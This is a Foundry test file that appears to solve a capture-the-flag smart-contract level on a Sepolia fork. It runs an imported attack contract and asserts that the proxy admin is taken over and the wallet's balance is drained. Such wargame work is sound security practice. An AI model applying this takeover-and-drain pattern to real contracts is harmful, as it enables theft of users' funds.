//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Hack, PuzzleProxy, PuzzleWallet} from "../src/level24.sol";

contract level24Test is Test {
    PuzzleProxy target;
    PuzzleWallet wallet;

    function setUp() public {
        vm.createSelectFork("SEPOLIA");
        address instanceAddress = vm.envAddress("INSTANCE_AD");
        target = PuzzleProxy(instanceAddress);
        wallet = PuzzleWallet(instanceAddress);
    }

    function testSolvesLeve24() public {
        address hacker = makeAddr("hacker");

        address adminBefore = target.admin();
        address ownerBefore = wallet.owner();
        uint256 contractBalanceBefore = address(target).balance;
        uint256 maxBalanceBefore = wallet.maxBalance();

        console.log("Admin before:", adminBefore);
        console.log("Owner before:", ownerBefore);
        console.log("Contract balance before:", contractBalanceBefore);
        console.log("Max balance before:", maxBalanceBefore);

        vm.startPrank(hacker, hacker);
        vm.deal(hacker, contractBalanceBefore);

        Hack hackContract = new Hack(address(target));
        hackContract.hack{value: contractBalanceBefore}(hacker);
        vm.stopPrank();

        address adminAfter = target.admin();
        address ownerAfter = wallet.owner();
        uint256 contractBalanceAfter = address(target).balance;
        uint256 maxBalanceAfter = wallet.maxBalance();

        console.log("Admin after:", adminAfter);
        console.log("Owner after:", ownerAfter);
        console.log("Contract balance after:", contractBalanceAfter);
        console.log("Max balance after:", maxBalanceAfter);

        assertEq(adminAfter, hacker, "Admin should be hacker address");
        assertEq(
            ownerAfter,
            address(hackContract),
            "Owner should be hack contract"
        );
        assertEq(contractBalanceAfter, 0, "Contract balance should be drained");
        assertEq(
            maxBalanceAfter,
            uint256(uint160(hacker)),
            "Max balance should be hacker address"
        );
    }
}
//INSTANCE_AD=0x7218951A89d6BF0cA3DAC0F8284074ACcF3e581b forge test --mt testSolvesLeve24 -vvv
